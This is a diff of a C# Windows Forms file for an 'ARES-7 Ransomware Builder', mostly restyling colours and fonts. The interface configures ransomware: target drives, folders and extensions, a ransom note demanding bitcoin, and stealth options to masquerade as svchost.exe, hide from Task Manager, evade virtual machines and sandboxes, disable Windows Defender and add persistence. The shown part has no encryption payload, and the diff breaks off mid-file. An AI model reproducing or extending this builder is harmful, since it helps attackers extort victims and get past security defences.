@@ -10,18 +10,21 @@ namespace RansomwareBuilder
 {
     public partial class Form1 : Form
     {
+        // ============================================================
+        // КОМПОНЕНТЫ ИНТЕРФЕЙСА
+        // ============================================================
         private TabControl tabControl;
         private ComboBox cbAlgorithm;
         private TextBox txtEncryptedExt;
         private CheckBox chkC, chkD, chkE, chkZ;
         private TextBox txtCustomDrive;
-        private TextBox txtIncludeFolders;
-        private TextBox txtExcludeFolders;
+        private RichTextBox txtIncludeFolders;
+        private RichTextBox txtExcludeFolders;
         private CheckedListBox clbExtensions;
         private TextBox txtCustomExt;
         private Label lblWallpaper;
         private TextBox txtNoteName;
-        private TextBox txtNoteContent;
+        private RichTextBox txtNoteContent;
         private CheckBox chkFakeProcess;
         private TextBox txtFakeProcessName;
         private CheckBox chkHideProcess;
@@ -44,25 +47,116 @@ namespace RansomwareBuilder
         private List<string> extensions = new List<string>();
         private string wallpaperPath = "";
         
+        // ============================================================
+        // ЦВЕТА (ТОЧНО КАК В PYTHON)
+        // ============================================================
+        private Color bgColor = Color.FromArgb(10, 10, 10);
+        private Color fgColor = Color.FromArgb(0, 255, 65);
+        private Color accentColor = Color.FromArgb(0, 204, 51);
+        private Color darkColor = Color.FromArgb(17, 17, 17);
+        private Color grayColor = Color.FromArgb(68, 68, 68);
+        private Color errorColor = Color.FromArgb(255, 51, 51);
+        private Color successColor = Color.FromArgb(0, 255, 65);
+        private Color yellowColor = Color.FromArgb(255, 170, 0);
+        
+        // ============================================================
+        // КОНСТРУКТОР
+        // ============================================================
         public Form1()
         {
             InitializeComponent();
             LoadExtensions();
             LoadDefaultSettings();
+            ApplyTheme();
         }
         
+        private void ApplyTheme()
+        {
+            // Применяем цвета ко всем элементам
+            this.BackColor = bgColor;
+            this.ForeColor = fgColor;
+            
+            foreach (Control ctrl in this.Controls)
+            {
+                ApplyThemeToControl(ctrl);
+            }
+        }
+        
+        private void ApplyThemeToControl(Control ctrl)
+        {
+            if (ctrl is Label lbl)
+            {
+                lbl.BackColor = bgColor;
+                lbl.ForeColor = fgColor;
+            }
+            else if (ctrl is Button btn)
+            {
+                btn.BackColor = darkColor;
+                btn.ForeColor = fgColor;
+                btn.FlatStyle = FlatStyle.Flat;
+                btn.FlatAppearance.BorderColor = fgColor;
+            }
+            else if (ctrl is TextBox txt)
+            {
+                txt.BackColor = darkColor;
+                txt.ForeColor = fgColor;
+                txt.BorderStyle = BorderStyle.FixedSingle;
+            }
+            else if (ctrl is RichTextBox rtb)
+            {
+                rtb.BackColor = darkColor;
+                rtb.ForeColor = fgColor;
+                rtb.BorderStyle = BorderStyle.FixedSingle;
+            }
+            else if (ctrl is ComboBox cb)
+            {
+                cb.BackColor = darkColor;
+                cb.ForeColor = fgColor;
+                cb.FlatStyle = FlatStyle.Flat;
+            }
+            else if (ctrl is CheckBox chk)
+            {
+                chk.BackColor = bgColor;
+                chk.ForeColor = fgColor;
+            }
+            else if (ctrl is CheckedListBox clb)
+            {
+                clb.BackColor = darkColor;
+                clb.ForeColor = fgColor;
+            }
+            else if (ctrl is TabControl tc)
+            {
+                tc.BackColor = bgColor;
+                tc.ForeColor = fgColor;
+            }
+            else if (ctrl is Panel pnl)
+            {
+                pnl.BackColor = bgColor;
+            }
+            
+            // Рекурсивно применяем к дочерним элементам
+            foreach (Control child in ctrl.Controls)
+            {
+                ApplyThemeToControl(child);
+            }
+        }
+        
+        // ============================================================
+        // ИНИЦИАЛИЗАЦИЯ ИНТЕРФЕЙСА
+        // ============================================================
         private void InitializeComponent()
         {
             this.Text = "🔐 ARES-7 Ransomware Builder v6.0 (C++)";
             this.Size = new Size(1150, 850);
-            this.BackColor = Color.FromArgb(10, 10, 10);
+            this.BackColor = bgColor;
             this.StartPosition = FormStartPosition.CenterScreen;
             this.MinimumSize = new Size(1000, 750);
             
             // TabControl
             tabControl = new TabControl();
             tabControl.Dock = DockStyle.Fill;
-            tabControl.BackColor = Color.FromArgb(10, 10, 10);
+            tabControl.BackColor = bgColor;
+            tabControl.ForeColor = fgColor;
             
             // Создаём вкладки
             var tab1 = CreateTabEncryption();
@@ -71,46 +165,69 @@ namespace RansomwareBuilder
             var tab4 = CreateTabStealth();
             var tab5 = CreateTabBuild();
             
+            // Настройка стиля вкладок (как в Python)
+            tabControl.DrawMode = TabDrawMode.OwnerDrawFixed;
+            tabControl.DrawItem += (s, e) => {
+                var tab = tabControl.TabPages[e.Index];
+                e.Graphics.FillRectangle(new SolidBrush(darkColor), e.Bounds);
+                TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, fgColor);
+                if (e.State == DrawItemState.Selected)
+                {
+                    e.Graphics.FillRectangle(new SolidBrush(accentColor), e.Bounds);
+                    TextRenderer.DrawText(e.Graphics, tab.Text, new Font("Segoe UI", 10, FontStyle.Bold), e.Bounds, Color.Black);
+                }
+            };
+            
             tabControl.TabPages.Add(tab1);
             tabControl.TabPages.Add(tab2);
             tabControl.TabPages.Add(tab3);
             tabControl.TabPages.Add(tab4);
             tabControl.TabPages.Add(tab5);
             
-            // Кнопка и статус
+            // Нижняя панель с кнопкой и статусом
             var bottomPanel = new Panel();
             bottomPanel.Dock = DockStyle.Bottom;
             bottomPanel.Height = 150;
-            bottomPanel.BackColor = Color.FromArgb(10, 10, 10);
+            bottomPanel.BackColor = bgColor;
             
+            // Кнопка сборки (как в Python — зелёная, крупная)
             btnBuild = new Button();
             btnBuild.Text = "🔥 ПОСТРОИТЬ RANSOMWARE";
             btnBuild.Dock = DockStyle.Bottom;
             btnBuild.Height = 60;
-            btnBuild.BackColor = Color.FromArgb(0, 204, 51);
+            btnBuild.BackColor = accentColor;
             btnBuild.ForeColor = Color.Black;
             btnBuild.Font = new Font("Segoe UI", 14, FontStyle.Bold);
+            btnBuild.FlatStyle = FlatStyle.Flat;
+            btnBuild.FlatAppearance.BorderSize = 0;
             btnBuild.Click += BtnBuild_Click;
             
+            // Строка статуса
             lblStatus = new Label();
             lblStatus.Dock = DockStyle.Bottom;
             lblStatus.Text = "✅ Готов к сборке";
-            lblStatus.ForeColor = Color.Gray;
-            lblStatus.Font = new Font("Segoe UI", 10);
+            lblStatus.ForeColor = grayColor;
+            lblStatus.Font = new Font("Segoe UI", 10, FontStyle.Bold);
             lblStatus.Height = 30;
+            lblStatus.BackColor = bgColor;
             
+            // Детальная строка
             lblDetail = new Label();
             lblDetail.Dock = DockStyle.Bottom;
             lblDetail.Text = "";
-            lblDetail.ForeColor = Color.DarkGray;
+            lblDetail.ForeColor = grayColor;
             lblDetail.Font = new Font("Segoe UI", 9);
             lblDetail.Height = 25;
+            lblDetail.BackColor = bgColor;
             
+            // Прогресс-бар
             progressBar = new ProgressBar();
             progressBar.Dock = DockStyle.Bottom;
             progressBar.Style = ProgressBarStyle.Marquee;
             progressBar.Visible = false;
             progressBar.Height = 20;
+            progressBar.BackColor = darkColor;
+            progressBar.ForeColor = fgColor;
             
             bottomPanel.Controls.Add(btnBuild);
             bottomPanel.Controls.Add(progressBar);
@@ -121,94 +238,111 @@ namespace RansomwareBuilder
             this.Controls.Add(bottomPanel);
         }
         
+        // ============================================================
+        // ВКЛАДКА: ШИФРОВАНИЕ
+        // ============================================================
         private TabPage CreateTabEncryption()
         {
             var tab = new TabPage("⚙ Шифрование");
-            tab.BackColor = Color.FromArgb(10, 10, 10);
+            tab.BackColor = bgColor;
             
             var panel = new TableLayoutPanel();
             panel.Dock = DockStyle.Fill;
             panel.ColumnCount = 2;
             panel.Padding = new Padding(15);
-            panel.BackColor = Color.FromArgb(10, 10, 10);
+            panel.BackColor = bgColor;
             
             // Алгоритм
-            panel.Controls.Add(CreateLabel("Алгоритм шифрования:"), 0, 0);
+            panel.Controls.Add(CreateLabel("Алгоритм шифрования:", fgColor, true), 0, 0);
             cbAlgorithm = new ComboBox();
             cbAlgorithm.Items.AddRange(new object[] { "AES-256", "Salsa20", "RSA" });
             cbAlgorithm.SelectedIndex = 0;
-            cbAlgorithm.BackColor = Color.FromArgb(17, 17, 17);
-            cbAlgorithm.ForeColor = Color.FromArgb(0, 255, 65);
+            cbAlgorithm.BackColor = darkColor;
+            cbAlgorithm.ForeColor = fgColor;
             cbAlgorithm.FlatStyle = FlatStyle.Flat;
+            cbAlgorithm.Font = new Font("Consolas", 10);
             panel.Controls.Add(cbAlgorithm, 1, 0);
             
             // Расширение зашифрованных
-            panel.Controls.Add(CreateLabel("Расширение зашифрованных файлов:"), 0, 1);
+            panel.Controls.Add(CreateLabel("Расширение зашифрованных файлов:", fgColor, true), 0, 1);
             txtEncryptedExt = new TextBox();
             txtEncryptedExt.Text = ".enc";
-            txtEncryptedExt.BackColor = Color.FromArgb(17, 17, 17);
-            txtEncryptedExt.ForeColor = Color.FromArgb(0, 255, 65);
+            txtEncryptedExt.BackColor = darkColor;
+            txtEncryptedExt.ForeColor = fgColor;
             txtEncryptedExt.BorderStyle = BorderStyle.FixedSingle;
+            txtEncryptedExt.Font = new Font("Consolas", 10);
             panel.Controls.Add(txtEncryptedExt, 1, 1);
             
             // Диски
-            panel.Controls.Add(CreateLabel("Диски для шифрования:"), 0, 2);
+            panel.Controls.Add(CreateLabel("Диски для шифрования:", fgColor, true), 0, 2);
             var drivesPanel = new FlowLayoutPanel();
             drivesPanel.FlowDirection = FlowDirection.LeftToRight;
-            drivesPanel.BackColor = Color.FromArgb(10, 10, 10);
+            drivesPanel.BackColor = bgColor;
             
-            chkC = new CheckBox(); chkC.Text = "C:\\"; chkC.ForeColor = Color.FromArgb(0, 255, 65); chkC.BackColor = Color.FromArgb(10, 10, 10);
-            chkD = new CheckBox(); chkD.Text = "D:\\"; chkD.ForeColor = Color.FromArgb(0, 255, 65); chkD.BackColor = Color.FromArgb(10, 10, 10);
-            chkE = new CheckBox(); chkE.Text = "E:\\"; chkE.ForeColor = Color.FromArgb(0, 255, 65); chkE.BackColor = Color.FromArgb(10, 10, 10);
-            chkZ = new CheckBox(); chkZ.Text = "Z:\\"; chkZ.ForeColor = Color.FromArgb(0, 255, 65); chkZ.BackColor = Color.FromArgb(10, 10, 10);
+            chkC = new CheckBox(); chkC.Text = "C:\\"; chkC.ForeColor = fgColor; chkC.BackColor = bgColor; chkC.Font = new Font("Consolas", 10);
+            chkD = new CheckBox(); chkD.Text = "D:\\"; chkD.ForeColor = fgColor; chkD.BackColor = bgColor; chkD.Font = new Font("Consolas", 10);
+            chkE = new CheckBox(); chkE.Text = "E:\\"; chkE.ForeColor = fgColor; chkE.BackColor = bgColor; chkE.Font = new Font("Consolas", 10);
+            chkZ = new CheckBox(); chkZ.Text = "Z:\\"; chkZ.ForeColor = fgColor; chkZ.BackColor = bgColor; chkZ.Font = new Font("Consolas", 10);
             
             drivesPanel.Controls.AddRange(new Control[] { chkC, chkD, chkE, chkZ });
             panel.Controls.Add(drivesPanel, 1, 2);
             
             // Добавить диск
-            panel.Controls.Add(CreateLabel("Добавить диск:"), 0, 3);
+            panel.Controls.Add(CreateLabel("Добавить диск:", fgColor, true), 0, 3);
             var addDrivePanel = new FlowLayoutPanel();
             addDrivePanel.FlowDirection = FlowDirection.LeftToRight;
-            addDrivePanel.BackColor = Color.FromArgb(10, 10, 10);
+            addDrivePanel.BackColor = bgColor;
             
             txtCustomDrive = new TextBox();
             txtCustomDrive.Width = 120;
-            txtCustomDrive.BackColor = Color.FromArgb(17, 17, 17);
-            txtCustomDrive.ForeColor = Color.FromArgb(0, 255, 65);
+            txtCustomDrive.BackColor = darkColor;
+            txtCustomDrive.ForeColor = fgColor;
             txtCustomDrive.BorderStyle = BorderStyle.FixedSingle;
+            txtCustomDrive.Font = new Font("Consolas", 10);
             
             var btnAddDrive = new Button();
             btnAddDrive.Text = "➕ Добавить";
-            btnAddDrive.BackColor = Color.FromArgb(17, 17, 17);
-            btnAddDrive.ForeColor = Color.FromArgb(0, 255, 65);
+            btnAddDrive.BackColor = darkColor;
+            btnAddDrive.ForeColor = fgColor;
             btnAddDrive.FlatStyle = FlatStyle.Flat;
+            btnAddDrive.Font = new Font("Consolas", 10);
             btnAddDrive.Click += (s, e) => {
                 if (!string.IsNullOrEmpty(txtCustomDrive.Text))
+                {
+                    var var = new CheckBox();
+                    var.Text = txtCustomDrive.Text;
+                    var.ForeColor = fgColor;
+                    var.BackColor = bgColor;
+                    var.Font = new Font("Consolas", 10);
+                    drivesPanel.Controls.Add(var);
                     MessageBox.Show($"Диск {txtCustomDrive.Text} добавлен");
+                    txtCustomDrive.Text = "";
+                }
             };
             
             addDrivePanel.Controls.AddRange(new Control[] { txtCustomDrive, btnAddDrive });
             panel.Controls.Add(addDrivePanel, 1, 3);
             
             // Папки для шифрования
-            panel.Controls.Add(CreateLabel("Папки для шифрования (по одной на строку):"), 0, 4);
-            txtIncludeFolders = new TextBox();
+            panel.Controls.Add(CreateLabel("Папки для шифрования (по одной на строку):", fgColor, true), 0, 4);
+            txtIncludeFolders = new RichTextBox();
             txtIncludeFolders.Multiline = true;
             txtIncludeFolders.Height = 80;
-            txtIncludeFolders.BackColor = Color.FromArgb(17, 17, 17);
-            txtIncludeFolders.ForeColor = Color.FromArgb(0, 255, 65);
+            txtIncludeFolders.BackColor = darkColor;
+            txtIncludeFolders.ForeColor = fgColor;
             txtIncludeFolders.BorderStyle = BorderStyle.FixedSingle;
             txtIncludeFolders.Font = new Font("Consolas", 9);
+            txtIncludeFolders.BackColor = Color.FromArgb(17, 17, 17);
             panel.Controls.Add(txtIncludeFolders, 1, 4);
             
             // Папки для обхода
-            panel.Controls.Add(CreateLabel("Папки для обхода (по одной на строку):"), 0, 5);
-            txtExcludeFolders = new TextBox();
+            panel.Controls.Add(CreateLabel("Папки для обхода (по одной на строку):", fgColor, true), 0, 5);
+            txtExcludeFolders = new RichTextBox();
             txtExcludeFolders.Multiline = true;
             txtExcludeFolders.Height = 80;
             txtExcludeFolders.Text = "C:\\Windows\r\nC:\\Program Files\r\nC:\\Program Files (x86)";
-            txtExcludeFolders.BackColor = Color.FromArgb(17, 17, 17);
-            txtExcludeFolders.ForeColor = Color.FromArgb(0, 255, 65);
+            txtExcludeFolders.BackColor = darkColor;
+            txtExcludeFolders.ForeColor = fgColor;
             txtExcludeFolders.BorderStyle = BorderStyle.FixedSingle;
             txtExcludeFolders.Font = new Font("Consolas", 9);
             panel.Controls.Add(txtExcludeFolders, 1, 5);
@@ -217,36 +351,41 @@ namespace RansomwareBuilder
             return tab;
         }
         
+        // ============================================================
+        // ВКЛАДКА: РАСШИРЕНИЯ
+        // ============================================================
         private TabPage CreateTabExtensions()
         {
             var tab = new TabPage("📁 Расширения");
-            tab.BackColor = Color.FromArgb(10, 10, 10);
+            tab.BackColor = bgColor;
             
             var panel = new TableLayoutPanel();
             panel.Dock = DockStyle.Fill;
             panel.RowCount = 3;
             panel.Padding = new Padding(15);
-            panel.BackColor = Color.FromArgb(10, 10, 10);
+            panel.BackColor = bgColor;
             
             // Заголовок
             var headerPanel = new FlowLayoutPanel();
             headerPanel.FlowDirection = FlowDirection.LeftToRight;
-            headerPanel.BackColor = Color.FromArgb(10, 10, 10);
-            headerPanel.Controls.Add(CreateLabel("Выберите расширения файлов для шифрования:"));
+            headerPanel.BackColor = bgColor;
+            headerPanel.Controls.Add(CreateLabel("Выберите расширения файлов для шифрования:", fgColor, true));
             
             var btnSelectAll = new Button();
             btnSelectAll.Text = "Выбрать все";
-            btnSelectAll.BackColor = Color.FromArgb(17, 17, 17);
-            btnSelectAll.ForeColor = Color.FromArgb(0, 255, 65);
+            btnSelectAll.BackColor = darkColor;
+            btnSelectAll.ForeColor = fgColor;
             btnSelectAll.FlatStyle = FlatStyle.Flat;
+            btnSelectAll.Font = new Font("Consolas", 9);
             btnSelectAll.Click += (s, e) => { for (int i = 0; i < clbExtensions.Items.Count; i++) clbExtensions.SetItemChecked(i, true); };
             headerPanel.Controls.Add(btnSelectAll);
             
             var btnDeselectAll = new Button();
             btnDeselectAll.Text = "Снять все";
-            btnDeselectAll.BackColor = Color.FromArgb(17, 17, 17);
-            btnDeselectAll.ForeColor = Color.FromArgb(0, 255, 65);
+            btnDeselectAll.BackColor = darkColor;
+            btnDeselectAll.ForeColor = fgColor;
             btnDeselectAll.FlatStyle = FlatStyle.Flat;
+            btnDeselectAll.Font = new Font("Consolas", 9);
             btnDeselectAll.Click += (s, e) => { for (int i = 0; i < clbExtensions.Items.Count; i++) clbExtensions.SetItemChecked(i, false); };
             headerPanel.Controls.Add(btnDeselectAll);
             
@@ -255,29 +394,32 @@ namespace RansomwareBuilder
             // Список расширений
             clbExtensions = new CheckedListBox();
             clbExtensions.Dock = DockStyle.Fill;
-            clbExtensions.BackColor = Color.FromArgb(17, 17, 17);
-            clbExtensions.ForeColor = Color.FromArgb(0, 255, 65);
+            clbExtensions.BackColor = darkColor;
+            clbExtensions.ForeColor = fgColor;
             clbExtensions.BorderStyle = BorderStyle.None;
+            clbExtensions.Font = new Font("Consolas", 9);
             panel.Controls.Add(clbExtensions, 0, 1);
             
             // Добавить своё расширение
             var addPanel = new FlowLayoutPanel();
             addPanel.FlowDirection = FlowDirection.LeftToRight;
-            addPanel.BackColor = Color.FromArgb(10, 10, 10);
+            addPanel.BackColor = bgColor;
             
-            addPanel.Controls.Add(CreateLabel("Добавить своё расширение:"));
+            addPanel.Controls.Add(CreateLabel("Добавить своё расширение:", fgColor, false));
             txtCustomExt = new TextBox();
             txtCustomExt.Width = 120;
-            txtCustomExt.BackColor = Color.FromArgb(17, 17, 17);
-            txtCustomExt.ForeColor = Color.FromArgb(0, 255, 65);
+            txtCustomExt.BackColor = darkColor;
+            txtCustomExt.ForeColor = fgColor;
             txtCustomExt.BorderStyle = BorderStyle.FixedSingle;
+            txtCustomExt.Font = new Font("Consolas", 10);
             addPanel.Controls.Add(txtCustomExt);
             
             var btnAddExt = new Button();
             btnAddExt.Text = "➕ Добавить";
-            btnAddExt.BackColor = Color.FromArgb(17, 17, 17);
-            btnAddExt.ForeColor = Color.FromArgb(0, 255, 65);
+            btnAddExt.BackColor = darkColor;
+            btnAddExt.ForeColor = fgColor;
             btnAddExt.FlatStyle = FlatStyle.Flat;
+            btnAddExt.Font = new Font("Consolas", 10);
             btnAddExt.Click += (s, e) => {
                 if (!string.IsNullOrEmpty(txtCustomExt.Text))
                 {
@@ -293,34 +435,39 @@ namespace RansomwareBuilder
             return tab;
         }
         
+        // ============================================================
+        // ВКЛАДКА: ОБОИ / ВЫКУП
+        // ============================================================
         private TabPage CreateTabWallpaper()
         {
             var tab = new TabPage("🖼 Обои / Выкуп");
-            tab.BackColor = Color.FromArgb(10, 10, 10);
+            tab.BackColor = bgColor;
             
             var panel = new TableLayoutPanel();
             panel.Dock = DockStyle.Fill;
             panel.RowCount = 4;
             panel.Padding = new Padding(15);
-            panel.BackColor = Color.FromArgb(10, 10, 10);
+            panel.BackColor = bgColor;
             
             // Обои
-            panel.Controls.Add(CreateLabel("Файл обоев (JPG/PNG/BMP):"), 0, 0);
+            panel.Controls.Add(CreateLabel("Файл обоев (JPG/PNG/BMP):", fgColor, true), 0, 0);
             var wallPanel = new FlowLayoutPanel();
             wallPanel.FlowDirection = FlowDirection.LeftToRight;
-            wallPanel.BackColor = Color.FromArgb(10, 10, 10);
+            wallPanel.BackColor = bgColor;
             
             lblWallpaper = new Label();
             lblWallpaper.Text = "Не выбрано";
-            lblWallpaper.ForeColor = Color.Gray;
+            lblWallpaper.ForeColor = grayColor;
             lblWallpaper.AutoSize = true;
+            lblWallpaper.BackColor = bgColor;
             wallPanel.Controls.Add(lblWallpaper);
             
             var btnWallpaper = new Button();
             btnWallpaper.Text = "📂 Выбрать";
-            btnWallpaper.BackColor = Color.FromArgb(17, 17, 17);
-            btnWallpaper.ForeColor = Color.FromArgb(0, 255, 65);
+            btnWallpaper.BackColor = darkColor;
+            btnWallpaper.ForeColor = fgColor;
             btnWallpaper.FlatStyle = FlatStyle.Flat;
+            btnWallpaper.Font = new Font("Consolas", 10);
             btnWallpaper.Click += (s, e) => {
                 using (var ofd = new OpenFileDialog())
                 {
@@ -329,39 +476,40 @@ namespace RansomwareBuilder
                     {
                         wallpaperPath = ofd.FileName;
                         lblWallpaper.Text = Path.GetFileName(ofd.FileName);
-                        lblWallpaper.ForeColor = Color.FromArgb(0, 255, 65);
+                        lblWallpaper.ForeColor = fgColor;
                     }
                 }
             };
             wallPanel.Controls.Add(btnWallpaper);
             
-            wallPanel.Controls.Add(CreateLabel("(JPG, PNG, BMP)", Color.Gray));
+            wallPanel.Controls.Add(CreateLabel("(JPG, PNG, BMP)", grayColor, false));
             panel.Controls.Add(wallPanel, 1, 0);
             
             // Имя файла выкупа
-            panel.Controls.Add(CreateLabel("Имя файла выкупа:"), 0, 1);
+            panel.Controls.Add(CreateLabel("Имя файла выкупа:", fgColor, true), 0, 1);
             var noteNamePanel = new FlowLayoutPanel();
             noteNamePanel.FlowDirection = FlowDirection.LeftToRight;
-            noteNamePanel.BackColor = Color.FromArgb(10, 10, 10);
+            noteNamePanel.BackColor = bgColor;
             
             txtNoteName = new TextBox();
             txtNoteName.Text = "READ_ME.txt";
             txtNoteName.Width = 200;
-            txtNoteName.BackColor = Color.FromArgb(17, 17, 17);
-            txtNoteName.ForeColor = Color.FromArgb(0, 255, 65);
+            txtNoteName.BackColor = darkColor;
+            txtNoteName.ForeColor = fgColor;
             txtNoteName.BorderStyle = BorderStyle.FixedSingle;
+            txtNoteName.Font = new Font("Consolas", 10);
             noteNamePanel.Controls.Add(txtNoteName);
-            noteNamePanel.Controls.Add(CreateLabel("(например: READ_ME.txt)", Color.Gray));
+            noteNamePanel.Controls.Add(CreateLabel("(например: READ_ME.txt)", grayColor, false));
             panel.Controls.Add(noteNamePanel, 1, 1);
             
             // Содержимое выкупа
-            panel.Controls.Add(CreateLabel("Содержимое файла выкупа:"), 0, 2);
-            txtNoteContent = new TextBox();
+            panel.Controls.Add(CreateLabel("Содержимое файла выкупа:", fgColor, true), 0, 2);
+            txtNoteContent = new RichTextBox();
             txtNoteContent.Multiline = true;
             txtNoteContent.Height = 150;
             txtNoteContent.Text = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
-            txtNoteContent.BackColor = Color.FromArgb(17, 17, 17);
-            txtNoteContent.ForeColor = Color.FromArgb(0, 255, 65);
+            txtNoteContent.BackColor = darkColor;
+            txtNoteContent.ForeColor = fgColor;
             txtNoteContent.BorderStyle = BorderStyle.FixedSingle;
             txtNoteContent.Font = new Font("Consolas", 9);
             panel.Controls.Add(txtNoteContent, 1, 2);
@@ -370,87 +518,98 @@ namespace RansomwareBuilder
             return tab;
         }
         
+        // ============================================================
+        // ВКЛАДКА: СКРЫТНОСТЬ
+        // ============================================================
         private TabPage CreateTabStealth()
         {
             var tab = new TabPage("🕵 Скрытность");
-            tab.BackColor = Color.FromArgb(10, 10, 10);
+            tab.BackColor = bgColor;
             
             var panel = new TableLayoutPanel();
             panel.Dock = DockStyle.Fill;
             panel.RowCount = 6;
             panel.Padding = new Padding(15);
-            panel.BackColor = Color.FromArgb(10, 10, 10);
+            panel.BackColor = bgColor;
             panel.AutoScroll = true;
             
             int row = 0;
             
             // Маскировка процесса
-            panel.Controls.Add(CreateLabel("Маскировка процесса:", Color.White), 0, row);
+            panel.Controls.Add(CreateLabel("Маскировка процесса:", Color.White, true), 0, row);
             var fakePanel = new FlowLayoutPanel();
             fakePanel.FlowDirection = FlowDirection.LeftToRight;
-            fakePanel.BackColor = Color.FromArgb(10, 10, 10);
+            fakePanel.BackColor = bgColor;
             
             chkFakeProcess = new CheckBox();
             chkFakeProcess.Text = "Включить фейк-процесс";
-            chkFakeProcess.ForeColor = Color.FromArgb(0, 255, 65);
-            chkFakeProcess.BackColor = Color.FromArgb(10, 10, 10);
+            chkFakeProcess.ForeColor = fgColor;
+            chkFakeProcess.BackColor = bgColor;
+            chkFakeProcess.Font = new Font("Segoe UI", 10);
             fakePanel.Controls.Add(chkFakeProcess);
             
             txtFakeProcessName = new TextBox();
             txtFakeProcessName.Text = "svchost.exe";
             txtFakeProcessName.Width = 120;
-            txtFakeProcessName.BackColor = Color.FromArgb(17, 17, 17);
-            txtFakeProcessName.ForeColor = Color.FromArgb(0, 255, 65);
+            txtFakeProcessName.BackColor = darkColor;
+            txtFakeProcessName.ForeColor = fgColor;
             txtFakeProcessName.BorderStyle = BorderStyle.FixedSingle;
+            txtFakeProcessName.Font = new Font("Consolas", 10);
             fakePanel.Controls.Add(txtFakeProcessName);
-            fakePanel.Controls.Add(CreateLabel("(имя в диспетчере)", Color.Gray));
+            fakePanel.Controls.Add(CreateLabel("(имя в диспетчере)", grayColor, false));
             
             panel.Controls.Add(fakePanel, 1, row++);
             
             // Скрытие процесса
-            panel.Controls.Add(CreateLabel("Скрытие процесса:", Color.White), 0, row);
+            panel.Controls.Add(CreateLabel("Скрытие процесса:", Color.White, true), 0, row);
             chkHideProcess = new CheckBox();
             chkHideProcess.Text = "Полное скрытие из Task Manager (требует админ-прав)";
-            chkHideProcess.ForeColor = Color.FromArgb(0, 255, 65);
-            chkHideProcess.BackColor = Color.FromArgb(10, 10, 10);
+            chkHideProcess.ForeColor = fgColor;
+            chkHideProcess.BackColor = bgColor;
+            chkHideProcess.Font = new Font("Segoe UI", 10);
             panel.Controls.Add(chkHideProcess, 1, row++);
             
             // Анти-VM
-            panel.Controls.Add(CreateLabel("Анти-VM:", Color.White), 0, row);
+            panel.Controls.Add(CreateLabel("Анти-VM:", Color.White, true), 0, row);
             chkAntiVM = new CheckBox();
             chkAntiVM.Text = "Завершить работу при обнаружении виртуальной машины";
-            chkAntiVM.ForeColor = Color.FromArgb(0, 255, 65);
-            chkAntiVM.BackColor = Color.FromArgb(10, 10, 10);
+            chkAntiVM.ForeColor = fgColor;
+            chkAntiVM.BackColor = bgColor;
+            chkAntiVM.Font = new Font("Segoe UI", 10);
             panel.Controls.Add(chkAntiVM, 1, row++);
             
             // Дополнительные методы
-            panel.Controls.Add(CreateLabel("Дополнительные методы обхода:", Color.White), 0, row);
+            panel.Controls.Add(CreateLabel("Дополнительные методы обхода:", Color.White, true), 0, row);
             var extraPanel = new FlowLayoutPanel();
             extraPanel.FlowDirection = FlowDirection.TopDown;
-            extraPanel.BackColor = Color.FromArgb(10, 10, 10);
+            extraPanel.BackColor = bgColor;
             
             chkDisableDefender = new CheckBox();
             chkDisableDefender.Text = "Отключение Windows Defender";
-            chkDisableDefender.ForeColor = Color.FromArgb(0, 255, 65);
-            chkDisableDefender.BackColor = Color.FromArgb(10, 10, 10);
+            chkDisableDefender.ForeColor = fgColor;
+            chkDisableDefender.BackColor = bgColor;
+            chkDisableDefender.Font = new Font("Segoe UI", 10);
             extraPanel.Controls.Add(chkDisableDefender);
             
             chkAddPersistence = new CheckBox();
             chkAddPersistence.Text = "Добавление в автозагрузку";
-            chkAddPersistence.ForeColor = Color.FromArgb(0, 255, 65);
-            chkAddPersistence.BackColor = Color.FromArgb(10, 10, 10);
+            chkAddPersistence.ForeColor = fgColor;
+            chkAddPersistence.BackColor = bgColor;
+            chkAddPersistence.Font = new Font("Segoe UI", 10);
             extraPanel.Controls.Add(chkAddPersistence);
             
             chkHideFilesAttr = new CheckBox();
             chkHideFilesAttr.Text = "Скрытие файлов (атрибут +h)";
-            chkHideFilesAttr.ForeColor = Color.FromArgb(0, 255, 65);
-            chkHideFilesAttr.BackColor = Color.FromArgb(10, 10, 10);
+            chkHideFilesAttr.ForeColor = fgColor;
+            chkHideFilesAttr.BackColor = bgColor;
+            chkHideFilesAttr.Font = new Font("Segoe UI", 10);
             extraPanel.Controls.Add(chkHideFilesAttr);
             
             chkSandboxDelay = new CheckBox();
             chkSandboxDelay.Text = "Задержка 60 сек (обход песочниц)";
-            chkSandboxDelay.ForeColor = Color.FromArgb(0, 255, 65);
-            chkSandboxDelay.BackColor = Color.FromArgb(10, 10, 10);
+            chkSandboxDelay.ForeColor = fgColor;
+            chkSandboxDelay.BackColor = bgColor;
+            chkSandboxDelay.Font = new Font("Segoe UI", 10);
             extraPanel.Controls.Add(chkSandboxDelay);
             
             panel.Controls.Add(extraPanel, 1, row++);
@@ -459,52 +618,58 @@ namespace RansomwareBuilder
             return tab;
         }
         
+        // ============================================================
+        // ВКЛАДКА: СБОРКА
+        // ============================================================
         private TabPage CreateTabBuild()
         {
             var tab = new TabPage("📦 Сборка");
-            tab.BackColor = Color.FromArgb(10, 10, 10);
+            tab.BackColor = bgColor;
             
             var panel = new TableLayoutPanel();
             panel.Dock = DockStyle.Fill;
             panel.RowCount = 4;
             panel.Padding = new Padding(15);
-            panel.BackColor = Color.FromArgb(10, 10, 10);
+            panel.BackColor = bgColor;
             
             // Имя файла
-            panel.Controls.Add(CreateLabel("Имя выходного файла:"), 0, 0);
+            panel.Controls.Add(CreateLabel("Имя выходного файла:", fgColor, true), 0, 0);
             var namePanel = new FlowLayoutPanel();
             namePanel.FlowDirection = FlowDirection.LeftToRight;
-            namePanel.BackColor = Color.FromArgb(10, 10, 10);
+            namePanel.BackColor = bgColor;
             
             txtOutputName = new TextBox();
             txtOutputName.Text = "ransomware.exe";
             txtOutputName.Width = 200;
-            txtOutputName.BackColor = Color.FromArgb(17, 17, 17);
-            txtOutputName.ForeColor = Color.FromArgb(0, 255, 65);
+            txtOutputName.BackColor = darkColor;
+            txtOutputName.ForeColor = fgColor;
             txtOutputName.BorderStyle = BorderStyle.FixedSingle;
+            txtOutputName.Font = new Font("Consolas", 10);
             namePanel.Controls.Add(txtOutputName);
-            namePanel.Controls.Add(CreateLabel("(например: update.exe)", Color.Gray));
